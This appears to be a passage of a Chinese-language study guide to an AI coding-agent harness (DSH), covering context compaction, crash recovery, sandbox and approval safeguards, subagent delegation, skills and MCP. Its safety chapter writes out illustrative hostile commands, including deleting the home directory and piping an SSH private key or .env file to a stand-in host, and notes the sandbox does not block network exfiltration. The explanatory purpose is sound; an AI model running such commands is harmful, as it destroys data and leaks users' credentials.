两层概念要分清：

  • spill（溢出存储）：同步、立即。一次工具调用发现结果太大，当场替换成“预览 + 一句「完整内容在 /path/xxx」”。模型如果需要全文，可以自己再调工具去读。
  • compaction（压缩）：异步、滞后。等到上下文压力上来了，才回头处理历史。

模型看到的东西，前后差别是这样的：

# 替换前：一次跑测试的输出，约 12 万 token（下一轮直接超窗）
$ npm test
... 8712 行测试日志 ...

# 替换后：约 400 token，有界但可追溯
$ npm test
[前 40 行 ...]
[... 省略 8,712 行 ...]
[末尾 20 行 ...]
完整输出已保存：~/.dsh/spill/2026-11-10/call_00_ET_85o.txt（可用 read 分段读取）

为什么要给模型保留“定位信息”？ 因为信息不该被静默丢弃。模型知道“有更多内容在那里”，就能做出选择：去读，还是不看。“有界但可追溯”，比“完整但爆炸”和“截断且丢失”都好。

另一个细节：工具结果写进日志的是 tool/result 事件，里面包的是一条 role: "tool" 的消息，带 toolCallId 指回那次调用。配对关系是强制的——API 层会拒绝没有配对结果的工具调用。所以第 9.2 节说的“失败要补结果”不是锦上添花，是不补就发不出去。

14 · 上下文管理：压缩不是“删除”，是“换书”

产品经理视角长任务寿命＋
谁的痛
长任务必然撞窗口，谁先撞谁先死
怎么解
剪枝优先于摘要、摘要复用缓存、失败不杀轮次
代价
摘要是有损压缩，模板再严也会丢细节，还要额外花钱
可迁移
所有降级都要可追溯：原始数据永远别删

现在来处理第 8.3 节埋的伏笔。这一章是整份文档里技术密度最高的，也是最值得反复读的。

14.1 为什么必须压缩（用真实的数字算一遍）

假设你用的模型上下文窗口是 1,048,576 token（DSH 目录里 DeepSeek 官方路由就是这个数），每次请求的输出上限 256,000。一次请求的输入是“系统提示词 + 工具 schema + 全部历史”。

如果你不压缩，第 N 轮的输入 ≈ 前 N−1 轮的总和，成本增长是近似二次的。一个连续干两小时的会话，最后几次请求每次可能要花掉几十万 token 的输入。

而且有个硬墙：超过窗口，提供方直接报错。DSH 把这类错误归一化成 CONTEXT_WINDOW_EXCEEDED。如果没人处理，它就是一个终态错误——这一轮彻底失败。

所以压缩不是“优化”，是让长任务能继续下去的必要条件。

14.2 什么时候触发：真实公式

大多数文章会说“用到 80% 就压缩”。DSH 的实际公式更细致：

阈值 = min( 窗口 × 0.8 ,  窗口 − 输出预留 − 头部空间 )
  • 窗口 W = 模型声明的上下文窗口
  • 输出预留 O = 本次请求的 maxTokens
  • 头部空间 B = headroomTokens，默认 65,536

代入默认值算一遍（这一步很值得你自己算，能看清很多设计意图）：

W = 1,048,576
O = 256,000
B = 65,536

窗口 × 0.8          = 838,860
窗口 − O − B        = 727,040     ← 这一项更小

阈值 = 727,040 ≈ 窗口的 69.3%（不是一个整齐的 80%）
保留尾部 = (W − O) × 0.16 ≈ 126,812 token
算一遍就懂

默认配置下真实触发点是窗口的 69.3%，不是直觉里的 80%。因为第二项「窗口 − 输出预留 − 头部空间」先命中了。这种「公式比直觉保守」的设计，在长任务里非常重要。

为什么要减掉 O 和 B？ 因为你要给“模型的回答”和“摘要本身”留位置。如果你压到 99% 才动手，那时候连生成摘要的空间都没有了，直接死锁。这个细节是“能跑”和“稳定”的分界线。

顺带一个工程经验：配置错误要加载时就报错。DSH 校验“保留比例必须小于阈值比例”，否则你一启动就失败，而不是跑了半小时才发现压不下去。

14.3 两步走：先剪枝，再摘要

顺序是写死的，而且剪枝之后会重新测一次——如果剪完已经够了，就完全省掉一次模型调用：

测压
  ↓ 超过阈值
第一步：剪枝（确定性，不花钱）
  ↓ 重新测压
  ↓ 还是超
第二步：摘要（要调一次模型，花钱）

第一步：工具结果剪枝（prune）

规则极其简单粗暴，但有效：把每个工具结果只留头 4096 个字符 + 尾 1024 个字符，中间换成一行标记 [... tool result middle pruned ...]。整条结果超过 8192 字符才动手。

为什么留头和尾？因为头通常是“命令 + 前几行结果”（有用），尾通常是“报错信息”（最有用）。中间那一大坨往往是重复的日志。

这一步的妙处：确定性、零成本、可预测。不需要模型参与，跑完一定变小。

第二步：摘要（summarize）

如果剪枝还不够，就要把旧历史压成一段摘要。这里的每个细节都值得看：

（1）摘要 prompt 是一个 8 节的固定模板，不许缺节，空的写 (none)：

■ Primary Request and Intent     用户最初和演变后的目标
■ Key Technical Concepts        用到的技术、框架、约定
■ Files and Code                精确路径：为什么重要、改了什么
■ Errors and Fixes              报错：怎么解决的，以及相关反馈
■ Pending Jobs                  明确要求但还没做完的
■ Current Work                  此刻正在做什么
■ Next Step                     下一个动作（只写一个）
■ Critical Context              决策与理由、约束、用户偏好、未决问题

配套的规则里有一条特别值得抄：“逐字保留文件路径、命令、错误串、标识符、数值、函数签名”。因为这些东西一旦被“总结”成同义词，就再也找不回来了。

（2）摘要调用要“逐字回放”前缀。 这是全篇最漂亮的一个工程技巧：摘要请求不是“另写一段 prompt 让它总结”，而是把上一次请求的完整前缀（系统提示词 + 工具 schema + 历史）原样再发一遍，最后追加一段“现在请你压缩以上内容”的指令。

为什么？因为这样只有尾部那一段是新的，前面的 KV cache 全部命中，摘要的成本从“重新读一遍全文”降到“只读一段新指令”。一个看似浪费 token 的设计，实际上是最省钱的写法。

（3）摘要不许变大。 落地前会校验：摘要的估算 token 数如果 ≥ 被替换内容的 token 数，直接报错 summary is not smaller than the shadowed content。防的是“压缩反而撑大”这种荒谬但真实会发生的 bug。

机制
日志完整保留，模型只看 surface：压缩是「换书」，不是「撕书」。

14.4 压缩怎么做到“日志不删、模型看不见”

回到第 8.3 节的 surface 机制。核心只有两种操作：

append                          正常追加一个节点
replace { startSeq, endSeq }    把这段闭区间遮蔽掉，在原位置插入新事件

压缩做的事就是：往 surface 上写一条 replace，把“从第 3 条到第 40 条历史”替换成“一条摘要消息”。于是：

  • 磁盘上：原始事件一条不少，日志完整可回放。
  • 模型眼里：只看到摘要 + 之后的近期历史。
  • 形式上：位置不变（摘要在原来那段的位置），所以后面所有引用关系依然成立。

压缩在代码层面就是一次 replace：

// 把 surface 上 seq 12..51 这一段，换成一串摘要节点
session.append('compaction/summary', { summary }, {
  surfaceOp: { op: 'replace', startSeq: 12, endSeq: 51 },
})
// 日志里 12..51 一条不少；deriveMessages() 之后，模型只看到摘要

还有一个必须小心的地方，文档里专门警告过：startSeq/endSeq 是“书架上的位置”，不是数值区间。 一次替换之后，新插入的摘要节点可能带着很高的 seq 落在很靠前的位置，于是下一次压缩时会出现 startSeq > endSeq 这种看起来不合法的情况。所以判断“到底遮蔽了哪些”要以 shadowedSeqs 为准，不要自己拿数字比大小。

对缓存的影响：替换发生在某个位置，该位置之前的前缀依然可以复用，之后的全部失效。这就是为什么剪枝只动中段（头尾不动可以保住更多前缀），也是为什么摘要要逐字回放。

15 · 持久化与恢复：崩溃之后还能接着干

产品经理视角恢复力＋
谁的痛
崩一次，两小时的活全白干
怎么解
只追加、每条 fsync、版本化迁移、补写中断的尾巴
代价
格式演进成本高，旧日志要长期维护 reader
可迁移
数据格式第一天就要有版本号和迁移链，这是廉价的保险

一个 agent 如果一崩就前功尽弃，那它只能干 5 分钟以内的活。

DSH 的持久化设计有四层，每层解决一个问题：

（1）格式：JSONL + 版本号

session.v4.jsonl.zstd      ← v4 = 当前格式；v1/v2/v3 是历史格式

一行一个事件，整体 zstd 压缩（也支持关掉压缩存纯文本，方便外部工具直接读）。第一行是头部，带 version。

为什么要版本号？ 因为事件结构会演进。老版本写的日志，新版本要能读懂——但不能“猜”。DSH 的做法是：每一代格式保留一个 frozen reader，并且只允许单向、相邻的迁移链（v0→v1→v2→v3→v4）。读到未来版本直接拒绝，而不是尽力解析。“宁可明确拒绝，不要错误解析”——读错一份历史，比读不出来严重得多。

（2）写入：延迟实体化 + 每条都 fsync

create() 时不写任何东西，第一次 append 才落盘。每次追加都 fsync，写失败就回滚到之前的字节长度。已提交的事件永不重写。

（3）崩溃恢复：修尾巴

进程被杀时，最后可能有一行写了一半。恢复时：不完整的最后一行丢弃；撕裂的压缩帧只取其中能完整解出的记录；如果最后一个轮次没写完（有 turn/start 没有 turn/end），由恢复流程补一个“中断”的结束事件。

注意这里的分工：存储层只管“能不能读”，语义修复归 agent 层。这是很清晰的职责划分，值得学。

（4）恢复与分叉：resume 和 fork

  • resume：加载已持久化的会话，重建 agent 接着跑。注意：恢复后模型选择保留（你上次用哪个模型，还是哪个）。
  • fork：从某个会话的精确前缀复制出一份新的。子会话的日志前 N 条是父会话事件的逐字复制，inheritedEventCount 记录分界点。

恢复一个会话，调用方只需要给 id：

const handle = await ctx.agents.resume({ sessionId: '9fb9dfe7-...' })
handle.agent.followup({                        // 接上原来那条对话
  content: [{ type: 'text', text: '继续，把剩下的测试补上' }],
  source: { kind: 'user' },
})

fork 的存在带来一个微妙问题：fork 出来的会话，算谁的历史？ DSH 用 parentSession（谁创建的）+ origin（来源类型）两个字段区分，而不是靠猜。

16 · 安全边界：三道护栏，和一条诚实的边界

产品经理视角信任＋
谁的痛
一次误删，团队再也不用它
怎么解
三道护栏（沙箱 / 审批 / 守卫）+ fail-closed + 明说边界
代价
审批打断心流，权限收紧降低「爽感」
可迁移
安全产品敢承认边界，比宣称全能更能建立信任

前面说过，agent 的双手是工具。有手就会惹祸。SAFETY.md 里写得很直白：这个项目“可以执行模型生成的代码与命令”，所以错误可能导致“损坏宿主计算机、修改或删除文件、泄露数据或凭据”。

这不是理论。bash 工具把模型给的命令原样变成 bash -c 去执行：一条 rm -rf ~、一条 cat ~/.ssh/id_rsa | curl -F f=@- evil.tld 都能成立。

DSH 用三道护栏，外加一条明确写在文档里的边界。

16.1 第一道：沙箱（sandbox）

关键认知：它拦的是文件效果，不是进程。 官方 JSDoc 里明写“网络与进程可见性不在本词汇表范围内”。

实现方式是 argv 包装：工具不直接 spawn 自己的命令，而是让 ctx.sandbox.confine(argv, policy, signal) 返回一个包装后的 argv，再 spawn 那个。按平台选执行器：

三种模式：

术语read-only
哪里都不能写，只有 /dev/null 能写。这是策略的 fail-safe 默认值。
术语workspace-write
能写会话工作区 + 显式允许的额外目录 + 平台临时目录。日常开发的默认。
术语danger-full-access
不做隔离，直接执行。用于你完全信任的场景。

没有可用的沙箱执行器时，直接拒绝（SANDBOX_UNAVAILABLE），绝不静默放行。 这个“失败要朝安全的方向失败”（fail-closed）的取向，贯穿整个安全层。

16.2 第二道：审批（approval）

当策略说“这个操作要问一下人”，就进审批流程。这里最重要的设计是一次性：

  • 批准只有一种结果 allowed-once，没有“永远允许”。
  • rejected / cancelled / unavailable 一律当拒绝。
  • 没有任何人能应答时（比如 SDK 里跑，没接 UI），默认拒绝。

四道 fail-closed 的闸门：没有应答者 → 拒绝；没装审批服务 → 拒绝；找不到该问哪个 agent → 拒绝；策略明写 never → 在瀑布之前就拒了，后挂的监听器插队也没用。

判定逻辑本身只有三行——没有“以后都允许”这个分支：

switch (decision) {
  case 'allowed-once': return run()                       // 只有这一种「批准」
  case 'rejected':
  case 'cancelled':
  case 'unavailable': return deny('需要重新确认')          // 其余一律拒绝（fail-closed）
}

而且批准不会被持久化：重启之后，上次批过的事情不会自动继续批。这在安全上是正确的默认——但用户体验上意味着“续跑时要重新确认危险操作”。

还有一个很实用的机制：升权（escalation）。工具 schema 里可以带 sandbox_permissions 和 justification 两个参数，即“我要用更宽的权限，理由是……”。允许的方向只有严格更宽（只读→工作区→全权），批准只作用于这一次调用，拒绝时错误信息会明确要求“停下来解释，而不是绕过去”。

16.3 第三道：单调守卫（monotonic guard）

第 12.3 节提过，这里补上它为什么必要。

假设三个插件都挂了权限监听器。A 说“允许”，B 说“拒绝”，C 说“允许”。最后谁说了算？如果按顺序可覆盖，那么任何一个插件的 bug 都能把安全策略变成摆设。

守卫的解法是：把“不可翻案的不变式”单独做成一种注册，它的返回值类型故意不含 allow：

ctx.tools.guard((exec) => string | undefined)
// 返回理由 = 拒绝；返回 undefined = 弃权（不表态）

没有 allow，就意味着没人能“推翻”它。真实的三类守卫：

  • 先读后编辑：没读过这个文件就不许改；读过但文件变了（版本过期）也不许改。
  • 超时：按工具声明的 timeoutMs 派生一个取消信号，超时给一条可读的错误。
  • 重复调用提醒：同一个工具、同样的参数，第 3/5/8 次就提醒模型“你可能在死循环”。

16.4 一条诚实的边界：网络不归沙箱管

这是我最欣赏这个项目的一点：它把“没做到的事”明确写出来，而不是假装做到了。

bwrap 的 profile 里没有 --unshare-net，SandboxMode 的文档明确写“网络与进程可见性不在范围内”。也就是说，在 read-only 模式下，bash -c 'curl -T .env https://x' 仍然可能发出去。

用之前先问清楚

你的 agent 沙箱管不管网络？如果文档没说，就当作不管——它很可能真的不管，因为限制网络要动容器或内核，比限制文件难得多。

补偿措施有三层：工具层的 web 访问只走固定 provider、审批、以及一个实验性的“自动复核”（用另一个模型逐次检查危险调用）。真要断网，得用容器或远程执行器替换整个能力。

为什么值得学这个？ 因为安全文档最忌讳“看起来什么都能防”。一个成熟的系统会说清：边界在哪、我防到什么程度、你怎么补。你可以对照检查自己在用的工具，看它有没有这么诚实。

顺带一个容易被忽略的细节：子进程的环境变量会经过“清洗”，名字里带 KEY/PASSWORD/SECRET/TOKEN 的变量和所有 DSH_* 变量不转发给子进程。这是防密钥外泄的第二道防线，成本极低，收益极高。

17 · 委派：让 agent 学会“叫别人干”

产品经理视角规模与隔离＋
谁的痛
单个 agent 的上下文装不下一个大任务
怎么解
子 agent 干脏活、只回结论、不继承私有工具
代价
信息在交接处丢失，父 agent 只看到一页纸
可迁移
委派的任务书要写清交付物，不只是任务

一个 agent 干长任务会遇到两个瓶颈：上下文会脏，串行太慢。

第一个更致命。你让它读 30 个文件，每个文件 2000 行——读完 3 个上下文就满了，剩下的全是摘要。“读了但没记住” 是长任务失败最常见的原因。

解法是委派：把“读 30 个文件”这件事扔给一个独立的 agent，它读、它脏、它只把结论交回来。父 agent 的上下文只增加一条消息。

17.2 结果怎么回来：一条通知，不是一段结果

这是 DSH 一个反直觉但很重要的设计。

大多数框架里，“调用子 agent”是一个工具调用，子 agent 的完整输出就是工具结果。DSH 不这样：

  • 工具本身立刻返回，内容只有 { kind: 'activation', name: 'agent-1' }，渲染成 started subagent agent-1。
  • 子 agent 干完之后，父 agent 会收到一条 user 角色的通知，第一行是固定的：
Background subagent agent-1 finished and will do no further work unless you send it more.

正文只有子 agent 最后一条非空 assistant 消息的文本。

上下文经济学
委派的本质是一次上下文交易：拿子 agent 的脏活换父 agent 的干净。

也就是说，父 agent 拿到的是一页纸的报告，不是子 agent 的完整工作记录。子 agent 翻了哪些文件、跑了什么命令、推理过程是什么——全部留在子会话里，不进父上下文。

这项设计的收益要量化才能体会：一个读了 30 个文件的子 agent，它的 transcript 可能是 20 万 token；而回到父 agent 的那条通知是 500 token。省了 99.75% 的上下文。

代价也很真实：如果子 agent 没把关键信息写进最后的总结，父 agent 就永远不知道。 所以写委派任务的 prompt 时，“要求它在最后汇报什么”比“要求它做什么”更需要斟酌。

17.3 三个必须知道的限制

（1）子 agent 看不到父 agent 的私有工具。 这来自 scope 机制：注册要么是全局的，要么恰好属于某一个 agent，带作用域的注册不向下继承。父 agent 通过 agent.ctx 注册的工具/提示词段/限制，子 agent 一个都看不到。

想给子 agent 特定能力，正确做法是给它一个 agent preset（一套预设的插件组合），而不是指望继承。

（2）并发有上限。 每棵委派树的活跃子 agent 默认上限 8，根不占名额；超额直接报 ACTIVATION_LIMIT_REACHED，不排队（因为排队会让“我以为派出去了”变成幻觉）。

（3）深度默认只有 1 层。 也就是“你可以派子 agent，但子 agent 不能再派”。默认 1 是有道理的：委派深度一深，成本和不可控性指数上升。需要更深得显式配置。

而且当深度到顶时，运行时上下文会明确告诉模型：大意是「当前深度 1、上限 1、剩余 0 层，不要在这个深度再调用 subagent」。把限制写进模型能看见的地方，比让模型试错撞墙优雅得多。

17.4 workflow：把委派写成一段脚本

如果你要做的不是“派一个”，而是“派 20 个，然后汇总”，一个一个调工具就太低效。DSH 的方案是让模型写一段 JavaScript：

const files = args.files
const results = await pipeline(files,
  f => agent(`审查 ${f} 的类型安全`, { label: f }),
  r => agent(`复核这条结论：${r}`, { label: 'verify' })
)
return results.filter(Boolean)

注意 pipeline 和 parallel 的区别，这是并行编排的核心概念：

  • parallel 是屏障：20 个人同时干，全干完才进下一步。
  • pipeline 是流水线：第 1 个文件进第二道工序时，第 2 个文件还在第一道——没有等待，总时间更短。

什么时候用哪个？如果第二阶段需要“全部结果放在一起看”，必须用 parallel；如果每个 item 独立走完全程，用 pipeline 快得多。这是能在任何编排框架里复用的判断。

workflow 的代价：它会阻塞父 agent 的整个轮次（可以选后台运行，注册成 job），脚本本身没有持久化、不能嵌套、不能恢复。所以官方建议也很克制：一两项委派用普通 subagent，只有真的要扇出到几十个才用 workflow。

17.5 Agent Team：多一块任务板

如果把“团队”理解成“多个 agent 共享一块任务看板”，那就对了。Team 不新造 agent，teammate 就是普通 subagent，它只多提供四个工具：team_task_create、team_task_list、team_task_get、team_task_update。

任务板的设计细节挺讲究：每个任务是 team/task 事件的完整版本化快照，更新要用 expectedRevision 做乐观并发控制（防止两个 agent 同时改同一张卡）；任务之间的依赖 blockedBy 必须是无环图（不能 A 等 B、B 又等 A）；writeScopes（谁写哪块）只是重叠提示，不是锁。

默认是关闭的。因为这个模式只在“任务能并行拆开、且有共享状态”时才划算。

18 · 扩展面：能力是怎么长出来的

产品经理视角生态＋
谁的痛
产品能力增长永远慢于用户需求
怎么解
五级扩展面，从写 markdown 到写插件都有路

一个 agent 产品能不能“越用越强”，取决于它有没有留扩展点。DSH 留了五条，按“改造成本从低到高”排列：

18.1 AGENTS.md：最便宜的“驯化”

模型启动时，harness 会自动把项目里的 AGENTS.md（或 CLAUDE.md）读进上下文。搜索规则是：从项目根（最近一个有 .git 的祖先目录）到当前工作目录，每一层都找。

有几个设计细节很实用：

  • 两条链：用户全局链（~/.dsh/AGENTS.md）+ 项目链。
  • 每条链有字节预算（默认 65,536 字节），超了会丢弃宽泛的文件、保留最具体的，并在上下文里明确告知“预算超了”。
  • 内容相同的文件只注入一次（CLAUDE.md 常常是 AGENTS.md 的副本）。
  • 如果后续读到了更深的目录，下一轮会把那个目录的 AGENTS.md 补进来。
  • 不监视外部编辑——你在编辑器里改了 AGENTS.md，要等下次读文件或恢复会话才生效。

最小的一个 AGENTS.md 只需要几行：

# AGENTS.md
- 改 packages/ 之前，先读 docs/architecture.md
- 提交前跑 pnpm run build:check
- 不要手改 lib/ 下的文件，它是构建产物
- 遇到不确定的接口，先 grep 调用方，不要猜

这几行会随每次会话自动进上下文。写它的收益，比写十页 Wiki 高。

DSH 自己的 AGENTS.md 有 19KB，写满了“必须先读架构文档”“模型可见就必须记录”“不许把可调参数硬编码”这类纪律。这就是“给 agent 看的项目规范”该有的样子：具体、可执行、有理由。

18.2 Skill：渐进式披露的教科书案例

Skill 是什么？最朴素的定义：一个目录，里面一个 SKILL.md，带 frontmatter：

---
name: pdf-report
description: 把数据表渲染成带图表的 PDF 报告
whenToUse: 用户要求生成 PDF/报告/打印版时
---

（这里是几百行的详细操作步骤）

机制的关键在它怎么进上下文——这是我认为最值得抄的一个设计：

  1. 只把 name + description（上限 500 字符）放进上下文，做成一份“菜单”，每次请求都带。
  2. 模型看到菜单，决定要用时，调用 skill({name}) 工具，这时才把正文读进来。
  3. 每次调用都重新读文件，所以改正文立即生效。

效果：假设你有 30 个 skill，每个正文 3000 字——合起来约 9 万字、近十万 token。但平时只占 30 × 100 ≈ 3000 token 的菜单位，用到哪个才加载哪个，差了三十倍。

这个模式叫 progressive disclosure（渐进式披露）。它解决的是“能力很多 vs 上下文有限”的根本矛盾，所有“工具/知识库特别多”的 agent 都该用。

Skill 的发现路径也是分层的（数字越小优先级越高）：项目的 .dsh/skills → 项目的 .agents/skills → 自定义目录 → 用户级的 ~/.dsh/skills → ~/.agents/skills → 内置。并且有文件监听，加一个目录不用重启。

18.3 MCP：接别人的工具

MCP（Model Context Protocol）是一个“工具供应商”的通用协议。DSH 的处理方式是：每接一个 MCP server，就等于注册了一批普通工具。

  • 工具名会被重命名成 mcp__<服务器名>__<原始名>，避免和内置工具撞名。
  • 传输支持 stdio（本地子进程）和 streamable-http（远程）。
  • 服务器自己给的说明（instructions）作为一段 mcp: 进系统提示词。
  • 资源（resources）由三个通用工具 list_mcp_resources / read_mcp_resource 惰性读取，不在连接时就拉内容。
  • 不支持 prompt 模板——这是明确的能力边界，文档里写了。

这套设计的启发：接外部工具时，“重命名 + 归一化 + 惰性读取”三件事必须做，否则要么撞名、要么启动卡住、要么上下文爆炸。

19 · 前端：为什么 agent 产品都需要一个“壳”

产品经理视角可观测界面＋
谁的痛
黑盒、看不见进度、打断不了、批准不了
怎么解
Host/Client 分离，内核不变、壳可换，类型化 RPC
代价
类型与 RPC 基础设施重，前期投入大
可迁移

最后补一块很多人忽略的部分：界面。

一个 agent 产品的前端不是“聊天框 + 气泡”。它要做的三件事都不简单：

  1. 把流式内容实时画出来（模型吐一个字画一个字，还要能中途插入工具卡片）。
  2. 把长任务的状态可视化（现在是第几步、在跑什么工具、卡在哪了）。
  3. 把控制权交给人（批准/拒绝、打断、切换文件、改设置）。

DSH 的做法是 Host / Client 分离 + 类型化 RPC：

  • Host（Node 进程）跑所有 agent、工具、存储。它把业务服务的某些方法标记为 @Remote，构建时自动生成前后端共享的类型声明。
  • Client（浏览器）只做渲染和交互，通过 RPC 调用 Host 的方法，通过事件流接收增量。
  • 中间的 api/ 目录就是“BFF”层，把业务服务包装成前端能调的接口。

后端把方法“标”出来，前端就自动有类型：

class GoalService extends TypertRemoteService {
  constructor(ctx: Context) { super(ctx, 'goals') }

  @Remote('create')                                  // 标记即可被前端调用
  createForClient(agent: Agent, req: CreateGoalRequest, signal: AbortSignal) {
    signal.throwIfAborted()
    return { accepted: true }
  }
}

复杂对象（比如 Agent）不会被序列化传过去，而是传 id、在 Host 侧还原——这是“前端只拿视图所需”的关键。

这么分的收益：同一套 Host 能同时服务 Web、桌面、SDK、ACP 四种壳。你换个界面，agent 逻辑一行不改。

它还解释了一个现象：为什么 agent 产品的 UI 代码量往往比 agent 逻辑还大？因为“流式渲染 + 状态可视化 + 人工介入”这三件事本身就重。DSH 的 packages/client/ 下有 50 多个 UI 插件，比 packages/core/ 多得多。

给你的实用建议：如果你要做 agent 产品，先想清楚“人在哪一刻介入”。是每一步都要批准（安全但烦），还是只在危险操作时问（默认选择），还是完全不管（无人值守）？这个决定会影响整个前后端的设计。

21 · 怎么读这类代码：四条方法论

谁的痛

怎么解
装配 → 主链路 → 决策记录，三条路径按序走
代价

可迁移

最后给方法。这份文档能给你结构，但你以后要自己读几十个这样的项目。

（1）从“装配”读，别从“入口函数”读。

大型项目没有单一入口，所有东西都是“被装配起来的”。先读那份 YAML / 配置文件 / DI 容器定义，你得到的是一张“系统由什么组成”的地图。比顺着 index.ts 追快十倍。

（2）顺“一条真实请求”读。

选一个具体动作（用户按回车 / 点批准 / 工具执行），跟着它走完全程。你会遇到的所有文件，就是核心文件。其他都先别管。

（3）看事件名和接口名，别急着看实现。

一个项目的词汇表（事件、服务名、类型名）就是这个项目的“世界观”。DSH 的 glossary.md 只有 46 行，读完你就知道它是怎么理解世界的。命名好的项目，接口即文档。

（4）找“决策记录”。

DSH 里叫 .agents/notes/，30MB，全是“为什么当初这么选、否决了什么方案”。这是整个仓库里最贵的东西——代码告诉你“怎么做的”，决策记录告诉你“为什么不那么做”。后者才是能迁移的经验。

具体到命令，三步就够开工：

# 1. 它由什么组成
dsh --profile web --dump-config | head -40

# 2. 一条主链路从哪开始
grep -rn "turn/start" packages/core/session/src/

# 3. 当初为什么这么选（最贵的东西在这里）
ls .agents/notes/implemented/architecture/ | head -20

顺便说一个学习误区：别试图读懂所有代码。 53 万行不是给人读完的。读懂结构、读懂关键决策、读懂一条主链路，就够了。剩下的在你需要改它的时候再读。

第 1–2 天｜跑起来，建立体感。

安装 DSH，跑一个真实任务（比如“把这个目录里的 Python 脚本都加上类型注解”）。重点观察：它调了几次工具、卡在哪里、你怎么打断它。先当用户，再当工程师。

第 3 天｜看自己的插件树。

第 4 天｜读一份真实的会话日志。

在 ~/.dsh/sessions/ 下找到刚才那次任务，解压后一条条看事件。注意 v4 文件是多个 zstd 帧拼接的：zstd -d 会自动接上，用 Node 的 zlib 则要按帧头 28 B5 2F FD 切开逐帧解。这是整个学习过程中信息密度最高的一小时。 你会亲眼看到 turn/start → step/start → request/header → tool/call → tool/result 的节奏。

第 5–6 天｜读三个包的 README。

按顺序：core/agent-loop（循环）、core/tools（工具）、core/session（日志）。DSH 的每个包都有中英双语 README，写得比很多书的章节还好。

第 7 天｜读架构文档和术语表。

docs/architecture.zh.md（175 行）+ docs/glossary.zh.md（46 行）。前者给你全局图，后者给你词汇表。先有词汇，才能读懂代码。

第 8–9 天｜读压缩和安全。

packages/compaction/compaction-basic + docs/subsystems/sandbox.zh.md。这两块是“demo vs 产品”的分水岭，也最容易在面试/评审里被问到。

第 10 天｜读委派。

packages/subagent/subagent。重点看“结果怎么回父级”和“scope 为什么不继承”。

第 11 天｜自己动手改一行配置。

不加代码，只改 YAML：换个模型、关掉一个工具、调低并发上限。然后 --dump-config 确认改动生效。这一步是从“读懂了”到“能用了”的分界。

第 12 天｜写一个 skill。

在你的项目里建 .dsh/skills/<名字>/SKILL.md，写一个你日常重复的流程。验证它出现在菜单里、模型会主动调用它。这是最便宜的能力扩展，一定要会。

第 13 天｜接一个 MCP server。

随便接一个（文件系统、数据库、GitHub 都行），观察它的工具如何出现在工具列表里、名字怎么被重命名。

第 14 天｜复盘：画你自己的架构图。

拿第 20 章的 12 个模块清单，给 DSH 每一行填上“它怎么做的 + 如果是我会怎么做”。能填满这张表，你就真的懂了。

如果这份文档你只记住三件事，我希望是这三件：

第一，agent 的难点不在模型，在“围绕模型的这套设施”。 提示词工程能让你做出一个惊艳的 demo；让你做出一个能连续工作两小时的产品的，是会话日志、上下文管理、持久化、权限边界这四件事。

第二，好的架构是“每一块都能被替换”。 DSH 的 220 行 YAML 不是炫技，它证明了这个系统里没有任何一块是不可替换的。你以后设计自己的项目时，可以问自己：“如果我要换掉这一块，需要改几处？”答案超过 3 处，就说明该分层了。

最后一句提醒：这个项目还在 developer preview 阶段，README 里明写着“未来会有破坏兼容性的变更”。所以你学它的时候，学的应该是它为什么这么设计，而不是记住某个具体的类名——类名会变，设计判断不会。
